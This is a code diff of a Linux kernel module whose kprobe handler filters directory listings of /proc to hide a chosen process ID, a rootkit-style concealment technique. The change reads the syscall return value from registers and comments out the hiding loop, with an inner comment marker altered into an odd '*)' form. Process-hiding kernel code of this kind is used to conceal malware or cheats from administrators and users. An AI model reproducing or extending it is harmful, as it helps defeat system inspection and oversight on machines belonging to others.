@@ -67,7 +67,7 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 
 	    //For storing the directory inode value
 	    struct inode *d_inode;
-		int ret = 400; // *(int*)(regs->user_regs.regs[0]);
+		int ret = *(int*)(regs->regs[0]);
 		wuwa_info("bsdk - ret %d, pid %d", ret, pid_hide);
 		int err = 0;
 
@@ -91,13 +91,13 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 		    proc = 1;
 			wuwa_info("dent64: called for proc");
 		}
-
+/*
 		if(proc) {
 		while (offset < ret)
 	    {
 		    dir = (void *)kdirent + offset;
 
-		    if ((proc && pid_hide > 0 && pid_hide == simple_strtoul(dir->d_name, NULL, 10)/*is_invisible(simple_strtoul(dir->d_name, NULL, 10))*/))
+		    if ((proc && pid_hide > 0 && pid_hide == simple_strtoul(dir->d_name, NULL, 10)/*is_invisible(simple_strtoul(dir->d_name, NULL, 10))*))
 		    {			
 			    if (dir == kdirent)
 			    {
@@ -125,7 +125,7 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 	        goto out;
 	    }
 		}
-		
+*/		
 	out:
 	    kfree(kdirent);
 	    return;
